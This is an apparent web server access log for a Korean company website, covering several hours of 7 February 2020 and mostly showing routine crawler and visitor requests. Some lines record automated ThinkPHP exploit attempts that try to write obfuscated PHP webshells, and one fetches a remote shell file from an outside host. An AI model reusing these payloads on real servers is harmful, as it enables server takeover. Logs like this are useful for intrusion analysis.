38.99.62.91 - - [07/Feb/2020:00:00:27 +0900] "GET /home/en/meetourpartners/all.do HTTP/1.1" 200 95227
38.99.62.91 - - [07/Feb/2020:00:01:06 +0900] "GET /home/en/meetourpartners/overseas.do HTTP/1.1" 200 31428
64.44.50.17 - - [07/Feb/2020:00:01:45 +0900] "GET /index.jsp HTTP/1.0" 302 -
64.44.50.17 - - [07/Feb/2020:00:01:46 +0900] "GET /home/en/main/main.do HTTP/1.0" 200 11080
64.44.50.17 - - [07/Feb/2020:00:01:48 +0900] "GET /home/en/contact/contact.do HTTP/1.0" 200 5187
38.99.62.91 - - [07/Feb/2020:00:02:25 +0900] "GET /home/en/meetourpartners/all.do HTTP/1.1" 200 95227
38.99.62.91 - - [07/Feb/2020:00:03:05 +0900] "GET /home/en/meetourpartners/overseas.do HTTP/1.1" 200 31428
117.239.149.94 - - [07/Feb/2020:00:03:36 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
38.99.62.91 - - [07/Feb/2020:00:03:44 +0900] "GET /home/news/news/view.do?page=1&num=11 HTTP/1.1" 200 5548
38.99.62.91 - - [07/Feb/2020:00:04:24 +0900] "GET /home/news/news/view.do?page=1&num=12 HTTP/1.1" 200 9083
103.82.235.2 - - [07/Feb/2020:00:04:26 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
38.99.62.91 - - [07/Feb/2020:00:05:04 +0900] "GET /home/en/meetourpartners/all.do HTTP/1.1" 200 95227
91.240.109.1 - - [07/Feb/2020:00:05:14 +0900] "GET /index.jsp HTTP/1.1" 302 -
91.240.109.1 - - [07/Feb/2020:00:05:14 +0900] "GET /home/main/main.do HTTP/1.1" 200 12222
38.99.62.91 - - [07/Feb/2020:00:05:44 +0900] "GET /home/news/news/view.do?page=1&num=11 HTTP/1.1" 200 5548
38.99.62.91 - - [07/Feb/2020:00:06:24 +0900] "GET /home/news/news/view.do?page=2&num=11 HTTP/1.1" 200 5548
38.99.62.91 - - [07/Feb/2020:00:07:04 +0900] "GET /home/news/news/view.do?page=2&num=10 HTTP/1.1" 200 6756
38.99.62.91 - - [07/Feb/2020:00:07:43 +0900] "GET /home/news/news/view.do?page=2&num=11 HTTP/1.1" 200 5548
38.99.62.91 - - [07/Feb/2020:00:08:23 +0900] "GET /home/news/news/view.do?page=2&num=12 HTTP/1.1" 200 9083
38.99.62.91 - - [07/Feb/2020:00:09:42 +0900] "GET /home/news/news/view.do?page=2&num=13 HTTP/1.1" 200 9159
38.99.62.91 - - [07/Feb/2020:00:11:01 +0900] "GET /home/news/news/view.do?page=2&num=14 HTTP/1.1" 200 6736
117.30.196.197 - - [07/Feb/2020:00:11:37 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
117.30.196.197 - - [07/Feb/2020:00:11:37 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
117.30.196.197 - - [07/Feb/2020:00:11:37 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
117.30.196.197 - - [07/Feb/2020:00:11:37 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
117.30.196.197 - - [07/Feb/2020:00:11:37 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
117.30.196.197 - - [07/Feb/2020:00:11:37 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
117.30.196.197 - - [07/Feb/2020:00:11:37 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
117.30.196.197 - - [07/Feb/2020:00:11:39 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
38.99.62.91 - - [07/Feb/2020:00:11:40 +0900] "GET /home/en/meetourpartners/all.do HTTP/1.1" 200 95227
38.99.62.91 - - [07/Feb/2020:00:12:20 +0900] "GET /home/news/news/view.do?page=2&num=14 HTTP/1.1" 200 6736
38.99.62.91 - - [07/Feb/2020:00:12:59 +0900] "GET /home/en/meetourpartners/all.do HTTP/1.1" 200 95227
38.99.62.91 - - [07/Feb/2020:00:13:39 +0900] "GET /home/news/news/view.do?page=2&num=15 HTTP/1.1" 200 9181
63.143.35.230 - - [07/Feb/2020:00:14:27 +0900] "GET /index.jsp HTTP/1.1" 302 -
63.143.35.230 - - [07/Feb/2020:00:14:27 +0900] "GET /home/main/main.do HTTP/1.1" 200 12222
38.99.62.91 - - [07/Feb/2020:00:14:58 +0900] "GET /home/news/news/view.do?page=2&num=16 HTTP/1.1" 200 5666
34.199.176.251 - - [07/Feb/2020:00:15:34 +0900] "GET /home/news/news/list.do HTTP/1.1" 200 7091
38.99.62.91 - - [07/Feb/2020:00:16:17 +0900] "GET /home/news/news/view.do?page=2&num=17 HTTP/1.1" 200 5761
38.99.62.91 - - [07/Feb/2020:00:17:36 +0900] "GET /home/en/meetourpartners/all.do HTTP/1.1" 200 95227
38.99.62.91 - - [07/Feb/2020:00:18:16 +0900] "GET /home/news/news/view.do?page=2&num=18 HTTP/1.1" 200 9137
38.99.62.91 - - [07/Feb/2020:00:18:55 +0900] "GET /home/en/meetourpartners/all.do HTTP/1.1" 200 95227
38.99.62.91 - - [07/Feb/2020:00:19:35 +0900] "GET /home/meetourpartners/all.do HTTP/1.1" 200 101569
38.99.62.91 - - [07/Feb/2020:00:20:54 +0900] "GET /home/meetourpartners/all.do HTTP/1.1" 200 101569
38.99.62.91 - - [07/Feb/2020:00:21:34 +0900] "GET /home/meetourpartners/all.do HTTP/1.1" 200 101569
38.99.62.91 - - [07/Feb/2020:00:22:13 +0900] "GET /home/news/news/view.do?page=2&num=18 HTTP/1.1" 200 9137
38.99.62.91 - - [07/Feb/2020:00:22:53 +0900] "GET /home/news/news/view.do?page=2&num=19 HTTP/1.1" 200 6164
34.199.176.251 - - [07/Feb/2020:00:27:37 +0900] "GET /home/news/news/view.do?num=1 HTTP/1.1" 200 8971
34.199.176.251 - - [07/Feb/2020:00:27:37 +0900] "GET /home/news/news/view.do HTTP/1.1" 500 3570
5.101.0.209 - - [07/Feb/2020:00:28:25 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
193.111.62.163 - - [07/Feb/2020:00:31:23 +0900] "GET /home/news/news/list.do HTTP/1.1" 200 7091
66.249.79.156 - - [07/Feb/2020:00:36:46 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
66.249.79.61 - - [07/Feb/2020:00:47:39 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3762
23.239.180.219 - - [07/Feb/2020:00:50:02 +0900] "GET /index.jsp HTTP/1.1" 302 -
23.239.180.219 - - [07/Feb/2020:00:50:02 +0900] "GET /home/en/main/main.do HTTP/1.1" 200 11080
5.101.0.209 - - [07/Feb/2020:00:53:35 +0900] "GET /index.jsp?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 302 -
5.101.0.209 - - [07/Feb/2020:00:53:36 +0900] "GET /home/main/main.do HTTP/1.1" 200 12222
5.101.0.209 - - [07/Feb/2020:00:53:37 +0900] "GET /index.jsp?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 302 -
5.101.0.209 - - [07/Feb/2020:00:53:38 +0900] "GET /home/main/main.do HTTP/1.1" 200 12222
121.254.147.237 - - [07/Feb/2020:00:55:04 +0900] "GET /index.jsp HTTP/1.1" 302 -
121.254.147.237 - - [07/Feb/2020:00:55:04 +0900] "GET /home/en/main/main.do HTTP/1.1" 200 11080
5.101.0.209 - - [07/Feb/2020:00:57:19 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
157.55.39.52 - - [07/Feb/2020:01:02:34 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
203.217.241.13 - - [07/Feb/2020:01:05:41 +0900] "GET /index.jsp HTTP/1.1" 302 -
203.217.244.13 - - [07/Feb/2020:01:05:41 +0900] "GET /home/main/main.do HTTP/1.1" 200 12222
203.217.242.194 - - [07/Feb/2020:01:05:41 +0900] "GET /home/main/main.do HTTP/1.1" 200 12222
203.217.241.13 - - [07/Feb/2020:01:05:41 +0900] "GET /home/main/main.do HTTP/1.1" 200 12222
203.217.242.13 - - [07/Feb/2020:01:05:41 +0900] "GET /home/main/main.do HTTP/1.1" 200 12222
203.217.243.130 - - [07/Feb/2020:01:05:41 +0900] "GET /home/main/main.do HTTP/1.1" 200 12222
66.249.79.157 - - [07/Feb/2020:01:06:36 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
58.187.97.172 - - [07/Feb/2020:01:16:55 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
125.209.235.168 - - [07/Feb/2020:01:25:48 +0900] "GET /home/whoweare/korea.do HTTP/1.1" 200 30366
66.249.79.61 - - [07/Feb/2020:01:27:11 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3762
115.219.196.108 - - [07/Feb/2020:01:29:36 +0900] "GET /home/watwedo/overview.do HTTP/1.1" 200 6147
42.236.10.114 - - [07/Feb/2020:01:29:40 +0900] "GET /home/watwedo/overview.do HTTP/1.1" 200 6147
42.236.10.93 - - [07/Feb/2020:01:29:40 +0900] "GET /index.jsp HTTP/1.1" 302 -
42.236.10.93 - - [07/Feb/2020:01:29:40 +0900] "GET /home/main/main.do HTTP/1.1" 302 -
180.163.220.5 - - [07/Feb/2020:01:29:40 +0900] "GET /home/watwedo/overview.do HTTP/1.1" 302 -
42.236.10.84 - - [07/Feb/2020:01:29:41 +0900] "GET /home/main/main.do HTTP/1.1" 200 8898
180.163.220.4 - - [07/Feb/2020:01:29:42 +0900] "GET /home/watwedo/overview.do HTTP/1.1" 200 7044
42.236.10.84 - - [07/Feb/2020:01:29:43 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3762
180.163.220.4 - - [07/Feb/2020:01:29:52 +0900] "GET /index.jsp HTTP/1.1" 302 -
180.163.220.4 - - [07/Feb/2020:01:29:52 +0900] "GET /home/main/main.do HTTP/1.1" 200 8898
180.163.220.67 - - [07/Feb/2020:01:29:56 +0900] "GET /index.jsp HTTP/1.1" 302 -
180.163.220.67 - - [07/Feb/2020:01:29:56 +0900] "GET /home/main/main.do HTTP/1.1" 200 8898
180.163.220.68 - - [07/Feb/2020:01:30:07 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3762
180.163.220.67 - - [07/Feb/2020:01:30:07 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
193.111.62.163 - - [07/Feb/2020:01:32:26 +0900] "GET /home/news/news/list.do HTTP/1.1" 200 7091
110.81.203.72 - - [07/Feb/2020:01:36:13 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
66.249.79.55 - - [07/Feb/2020:01:37:04 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3762
157.55.39.52 - - [07/Feb/2020:01:48:17 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
52.231.161.97 - - [07/Feb/2020:01:50:34 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
52.231.161.97 - - [07/Feb/2020:01:50:34 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
66.249.79.55 - - [07/Feb/2020:01:58:21 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3762
3.90.66.1 - - [07/Feb/2020:01:59:04 +0900] "GET /index.jsp HTTP/1.1" 302 -
3.90.66.1 - - [07/Feb/2020:01:59:05 +0900] "GET /home/main/main.do HTTP/1.1" 200 12222
3.90.66.1 - - [07/Feb/2020:01:59:05 +0900] "GET /home/main/main.do HTTP/1.1" 200 12222
3.90.66.1 - - [07/Feb/2020:01:59:05 +0900] "GET /home/main/main.do HTTP/1.1" 200 12222
118.71.22.21 - - [07/Feb/2020:02:02:31 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
157.55.39.52 - - [07/Feb/2020:02:05:44 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
216.160.239.174 - - [07/Feb/2020:02:06:14 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
216.160.239.174 - - [07/Feb/2020:02:06:48 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
66.249.79.55 - - [07/Feb/2020:02:07:40 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3762
140.143.57.189 - - [07/Feb/2020:02:14:33 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
140.143.57.189 - - [07/Feb/2020:02:14:34 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
140.143.57.189 - - [07/Feb/2020:02:14:34 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
140.143.57.189 - - [07/Feb/2020:02:14:35 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
140.143.57.189 - - [07/Feb/2020:02:14:35 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
140.143.57.189 - - [07/Feb/2020:02:14:36 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
140.143.57.189 - - [07/Feb/2020:02:14:36 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
140.143.57.189 - - [07/Feb/2020:02:14:36 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
140.143.57.189 - - [07/Feb/2020:02:14:36 +0900] "GET /index.jsp HTTP/1.1" 302 -
140.143.57.189 - - [07/Feb/2020:02:14:37 +0900] "GET /home/main/main.do HTTP/1.1" 200 12222
17.58.96.118 - - [07/Feb/2020:02:16:16 +0900] "GET /home/about/about.do HTTP/1.1" 200 14216
66.249.79.157 - - [07/Feb/2020:02:17:45 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
193.111.62.163 - - [07/Feb/2020:02:24:51 +0900] "GET /home/news/news/list.do HTTP/1.1" 200 7091
66.249.79.61 - - [07/Feb/2020:02:28:38 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3762
203.160.61.228 - - [07/Feb/2020:02:28:55 +0900] "GET /index.jsp HTTP/1.1" 302 -
34.199.176.251 - - [07/Feb/2020:02:33:04 +0900] "GET /home/news/news/view.do?num=3 HTTP/1.1" 200 5573
34.199.176.251 - - [07/Feb/2020:02:33:05 +0900] "GET /home/news/news/view.do HTTP/1.1" 500 3570
207.46.13.108 - - [07/Feb/2020:02:34:18 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
45.33.66.85 - - [07/Feb/2020:02:37:26 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
94.158.36.183 - - [07/Feb/2020:02:46:00 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
94.158.36.183 - - [07/Feb/2020:02:46:02 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
149.129.96.164 - - [07/Feb/2020:02:46:44 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
149.129.96.164 - - [07/Feb/2020:02:46:44 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3762
222.186.19.221 - - [07/Feb/2020:02:53:16 +0900] "CONNECT /index.jsp HTTP/1.1" 405 1105
40.77.167.74 - - [07/Feb/2020:02:54:34 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
119.207.72.77 - - [07/Feb/2020:02:56:55 +0900] "GET /index.jsp HTTP/1.1" 302 -
119.207.72.77 - - [07/Feb/2020:02:56:55 +0900] "GET /home/main/main.do HTTP/1.1" 200 12222
171.12.10.41 - - [07/Feb/2020:03:03:57 +0900] "HEAD /index.jsp HTTP/1.1" 302 -
171.12.10.41 - - [07/Feb/2020:03:03:58 +0900] "HEAD /home/en/main/main.do HTTP/1.1" 200 -
66.249.79.58 - - [07/Feb/2020:03:08:04 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3762
114.239.52.151 - - [07/Feb/2020:03:11:32 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
114.239.106.210 - - [07/Feb/2020:03:11:32 +0900] "GET /index.jsp HTTP/1.1" 302 -
114.239.53.231 - - [07/Feb/2020:03:11:32 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
114.239.53.231 - - [07/Feb/2020:03:11:32 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
114.239.106.52 - - [07/Feb/2020:03:11:32 +0900] "GET /index.jsp?s=index/\think\template\driver\file/write&cacheFile=robots1.php&content=xbshell<?php%20@eval($_POST[admin]);?> HTTP/1.1" 302 -
114.239.106.52 - - [07/Feb/2020:03:11:32 +0900] "GET /index.jsp?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=12345.php&vars[1][1]=<?php%20$poc%20="axsxsxexrxt";$poc_1%20=%20explode("x",%20$poc);%20$poc_2%20=%20$poc_1[0]%20.%20$poc_1[1]%20.%20$poc_1[2]%20.%20$poc_1[3].%20$poc_1[4].%20$poc_1[5];$poc_2(urldecode(urldecode(urldecode($_REQUEST['12345']))));?> HTTP/1.1" 302 -
114.239.106.52 - - [07/Feb/2020:03:11:33 +0900] "GET /index.jsp?s=index/\think\template\driver\file/write&cacheFile=robots.php&content=xbshell1<?php$password%20=%20"xinba";$ch%20=%20explode(".","hello.ass.world.er.t");array_intersect_ukey(array($_REQUEST[$password]%20=>%201),%20array(1),%20$ch[1].$ch[3].$ch[4]);?> HTTP/1.1" 302 -
114.239.106.52 - - [07/Feb/2020:03:11:33 +0900] "GET /index.jsp?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=@eval($_GET[%27fuck%27]);&fuck=fputs(fopen(base64_decode(eC5waHA),w),base64_decode(PD9waHAgZXZhbCgkX1BPU1RbeGlhb10pPz54YnNoZWxs)); HTTP/1.1" 302 -
114.239.106.52 - - [07/Feb/2020:03:11:33 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
114.239.104.199 - - [07/Feb/2020:03:11:33 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
114.239.106.210 - - [07/Feb/2020:03:11:34 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
114.239.106.210 - - [07/Feb/2020:03:11:35 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
49.89.248.71 - - [07/Feb/2020:03:11:35 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
114.239.105.182 - - [07/Feb/2020:03:11:36 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
114.239.105.89 - - [07/Feb/2020:03:11:36 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
49.89.248.71 - - [07/Feb/2020:03:11:36 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
114.239.107.251 - - [07/Feb/2020:03:11:39 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
114.239.53.231 - - [07/Feb/2020:03:11:40 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
114.239.105.89 - - [07/Feb/2020:03:11:40 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
49.89.248.71 - - [07/Feb/2020:03:11:40 +0900] "GET /index.jsp?a=fetch&templateFile=public/index&prefix=''&content=<php>file_put_contents('nuan.php',file_get_contents('http://www.520yxsf.com/shell.txt'));</php> HTTP/1.1" 302 -
116.252.0.52 - - [07/Feb/2020:03:14:44 +0900] "CONNECT /index.jsp HTTP/1.1" 405 1105
124.225.43.135 - - [07/Feb/2020:03:14:45 +0900] "GET /index.jsp HTTP/1.1" 302 -
222.82.49.76 - - [07/Feb/2020:03:14:47 +0900] "CONNECT /index.jsp HTTP/1.1" 405 1105
123.191.133.105 - - [07/Feb/2020:03:14:47 +0900] "GET /index.jsp HTTP/1.1" 302 -
124.235.138.146 - - [07/Feb/2020:03:14:47 +0900] "GET /index.jsp HTTP/1.1" 302 -
221.13.12.198 - - [07/Feb/2020:03:14:49 +0900] "GET /index.jsp HTTP/1.1" 302 -
171.36.129.136 - - [07/Feb/2020:03:14:51 +0900] "CONNECT /index.jsp HTTP/1.1" 405 1105
106.45.1.137 - - [07/Feb/2020:03:14:52 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
182.138.163.136 - - [07/Feb/2020:03:14:52 +0900] "GET /index.jsp HTTP/1.1" 302 -
112.66.97.254 - - [07/Feb/2020:03:14:53 +0900] "CONNECT /index.jsp HTTP/1.1" 405 1105
193.111.62.163 - - [07/Feb/2020:03:23:34 +0900] "GET /home/news/news/list.do HTTP/1.1" 200 7091
58.218.25.33 - - [07/Feb/2020:03:31:24 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
209.210.48.124 - - [07/Feb/2020:03:33:33 +0900] "GET /home/en/meetourpartners/all.do HTTP/1.1" 200 95227
66.249.79.156 - - [07/Feb/2020:03:38:09 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
77.75.78.170 - - [07/Feb/2020:03:39:21 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
207.46.13.108 - - [07/Feb/2020:03:47:02 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
3.81.117.132 - - [07/Feb/2020:03:49:34 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
3.81.117.132 - - [07/Feb/2020:03:49:37 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
189.28.39.238 - - [07/Feb/2020:04:06:30 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
96.126.103.73 - - [07/Feb/2020:04:11:50 +0900] "GET /index.jsp HTTP/1.1" 302 -
96.126.103.73 - - [07/Feb/2020:04:11:50 +0900] "GET /home/main/main.do HTTP/1.1" 200 12222
157.55.39.52 - - [07/Feb/2020:04:12:38 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
66.249.79.61 - - [07/Feb/2020:04:17:55 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3762
207.46.13.108 - - [07/Feb/2020:04:22:19 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
193.111.62.163 - - [07/Feb/2020:04:28:12 +0900] "GET /home/news/news/list.do HTTP/1.1" 200 7091
207.46.13.108 - - [07/Feb/2020:04:30:48 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
189.6.243.118 - - [07/Feb/2020:04:33:07 +0900] "GET /index.jsp HTTP/1.1" 302 -
189.6.243.118 - - [07/Feb/2020:04:33:11 +0900] "GET /home/en/main/main.do HTTP/1.1" 200 11080
222.231.30.115 - - [07/Feb/2020:04:33:15 +0900] "GET /index.jsp HTTP/1.1" 302 -
222.231.30.115 - - [07/Feb/2020:04:33:15 +0900] "GET /home/main/main.do HTTP/1.1" 200 12222
222.231.30.115 - - [07/Feb/2020:04:33:17 +0900] "GET /home/main/main.do HTTP/1.1" 200 12222
157.55.39.52 - - [07/Feb/2020:04:33:17 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
222.231.30.115 - - [07/Feb/2020:04:33:18 +0900] "GET /home/main/main.do HTTP/1.1" 200 12222
157.55.39.34 - - [07/Feb/2020:04:36:01 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3762
83.97.20.33 - - [07/Feb/2020:04:36:21 +0900] "OPTIONS /index.jsp HTTP/1.0" 405 1105
157.55.39.34 - - [07/Feb/2020:04:37:19 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3762
157.55.39.34 - - [07/Feb/2020:04:38:40 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3762
77.75.79.11 - - [07/Feb/2020:04:54:43 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
77.75.79.11 - - [07/Feb/2020:04:55:06 +0900] "GET /home/en/watwedo/overview.do HTTP/1.1" 200 6156
189.6.243.118 - - [07/Feb/2020:04:57:00 +0900] "GET /home/en/about/about.do HTTP/1.1" 200 14811
189.6.243.118 - - [07/Feb/2020:04:57:00 +0900] "GET /home/main/main.do HTTP/1.1" 200 12222
189.6.243.118 - - [07/Feb/2020:04:57:00 +0900] "GET /home/en/meetourpartners/all.do HTTP/1.1" 200 95227
189.6.243.118 - - [07/Feb/2020:04:57:00 +0900] "GET /home/en/watwedo/overview.do HTTP/1.1" 200 6156
189.6.243.118 - - [07/Feb/2020:04:57:00 +0900] "GET /home/en/contact/contact.do HTTP/1.1" 200 5187
189.6.243.118 - - [07/Feb/2020:04:57:00 +0900] "GET /home/en/whoweare/korea.do HTTP/1.1" 200 30344
189.6.243.118 - - [07/Feb/2020:04:57:00 +0900] "GET /home/en/watwedo/philosophy.do HTTP/1.1" 200 7112
51.15.15.164 - - [07/Feb/2020:05:02:24 +0900] "GET /home/en/contact/contact.do HTTP/1.0" 200 7252
91.242.162.8 - - [07/Feb/2020:05:15:12 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
91.242.162.8 - - [07/Feb/2020:05:15:12 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
193.111.62.163 - - [07/Feb/2020:05:30:07 +0900] "GET /home/news/news/list.do HTTP/1.1" 200 7091
42.202.157.221 - - [07/Feb/2020:05:32:05 +0900] "GET /index.jsp HTTP/1.1" 302 -
42.202.157.221 - - [07/Feb/2020:05:32:05 +0900] "GET /home/en/main/main.do HTTP/1.1" 302 -
42.202.157.221 - - [07/Feb/2020:05:32:06 +0900] "GET /home/en/main/main.do HTTP/1.1" 200 8279
42.202.157.221 - - [07/Feb/2020:05:32:08 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3762
77.75.77.109 - - [07/Feb/2020:05:41:32 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
119.207.72.153 - - [07/Feb/2020:05:54:01 +0900] "GET /index.jsp HTTP/1.1" 302 -
119.207.72.153 - - [07/Feb/2020:05:54:01 +0900] "GET /home/main/main.do HTTP/1.1" 200 12222
43.239.154.166 - - [07/Feb/2020:05:55:02 +0900] "GET /index.jsp HTTP/1.1" 302 -
23.226.211.120 - - [07/Feb/2020:05:56:53 +0900] "GET /index.jsp HTTP/1.1" 302 -
23.226.211.120 - - [07/Feb/2020:05:56:53 +0900] "GET /home/en/main/main.do HTTP/1.1" 200 11080
207.46.13.62 - - [07/Feb/2020:06:00:30 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
54.146.43.69 - - [07/Feb/2020:06:01:52 +0900] "GET /error/kr/error.jsp HTTP/1.0" 500 3570
94.158.36.183 - - [07/Feb/2020:06:04:35 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
94.158.36.183 - - [07/Feb/2020:06:04:36 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
157.55.39.134 - - [07/Feb/2020:06:15:32 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
66.249.79.61 - - [07/Feb/2020:06:17:35 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3762
62.109.18.158 - - [07/Feb/2020:06:20:17 +0900] "GET /home/en/contact/contact.do HTTP/1.0" 200 5187
62.109.18.158 - - [07/Feb/2020:06:20:18 +0900] "GET /home/en/contact/contact.do HTTP/1.0" 200 5187
193.111.62.163 - - [07/Feb/2020:06:26:09 +0900] "GET /home/news/news/list.do HTTP/1.1" 200 7091
77.75.77.109 - - [07/Feb/2020:06:27:16 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
66.249.79.55 - - [07/Feb/2020:06:29:07 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3762
157.55.39.134 - - [07/Feb/2020:06:29:21 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
66.249.79.61 - - [07/Feb/2020:06:50:07 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3762
157.55.39.134 - - [07/Feb/2020:06:53:27 +0900] "GET /home/whoweare/korea.do HTTP/1.1" 200 30366
51.68.152.26 - - [07/Feb/2020:06:59:12 +0900] "GET /index.jsp HTTP/1.1" 302 -
51.68.152.26 - - [07/Feb/2020:06:59:12 +0900] "GET /home/en/main/main.do HTTP/1.1" 200 11080
66.249.79.55 - - [07/Feb/2020:07:00:11 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3762
179.43.169.182 - - [07/Feb/2020:07:00:14 +0900] "GET /index.jsp HTTP/1.1" 302 -
179.43.169.182 - - [07/Feb/2020:07:00:14 +0900] "GET /home/main/main.do HTTP/1.1" 200 12222
157.55.39.52 - - [07/Feb/2020:07:06:15 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
207.46.13.73 - - [07/Feb/2020:07:07:32 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
103.131.71.52 - - [07/Feb/2020:07:16:55 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
103.131.71.43 - - [07/Feb/2020:07:17:05 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3762
103.131.71.44 - - [07/Feb/2020:07:17:17 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
77.75.79.72 - - [07/Feb/2020:07:21:36 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
193.111.62.163 - - [07/Feb/2020:07:27:17 +0900] "GET /home/news/news/list.do HTTP/1.1" 200 7091
78.46.61.245 - - [07/Feb/2020:07:28:54 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
66.249.79.61 - - [07/Feb/2020:07:30:04 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3762
175.223.31.2 - - [07/Feb/2020:07:33:49 +0900] "GET /index.jsp HTTP/1.1" 302 -
175.223.31.2 - - [07/Feb/2020:07:33:49 +0900] "GET /home/main/main.do HTTP/1.1" 302 -
175.223.31.2 - - [07/Feb/2020:07:33:49 +0900] "GET /home/main/main.do HTTP/1.1" 200 8898
175.223.31.2 - - [07/Feb/2020:07:33:50 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3762
175.223.31.2 - - [07/Feb/2020:07:33:55 +0900] "GET /home/meetourpartners/all.do HTTP/1.1" 200 105128
